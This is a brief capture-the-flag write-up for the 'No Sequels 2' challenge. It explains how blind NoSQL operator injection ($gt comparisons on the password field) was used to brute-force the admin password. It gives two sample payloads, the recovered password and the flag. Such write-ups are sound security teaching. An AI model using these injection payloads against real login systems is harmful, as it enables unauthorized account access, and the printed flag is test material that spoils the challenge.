No Sequels 2
This was the same task as before but here we had to use blind NoSQL injection in order to fetch all of the pasword's characters by using the payload above. E.g.

{"username": "admin", "password": {"$gt": "a"}} -> true
{"username": "admin", "password": {"$gt": "z"}} -> false

By bruteforcing all characters we get the password congratsyouwin and then the flag: actf{stillnosqlinthe_sequel}
Solving script: ./NoSequels2/solve.py
